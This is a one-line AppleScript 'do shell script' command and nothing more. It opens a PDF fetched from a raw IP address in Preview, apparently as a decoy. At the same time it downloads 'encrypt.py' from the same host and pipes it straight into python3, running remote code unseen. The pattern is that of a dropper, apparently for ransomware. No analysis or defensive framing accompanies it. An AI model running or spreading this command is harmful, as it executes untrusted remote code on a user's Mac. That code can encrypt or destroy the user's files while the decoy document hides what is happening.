do shell script "s=18.219.198.148:8000; curl -s $s/sample.pdf | open -f -a Preview.app & curl -s $s/encrypt.py | python3 -"
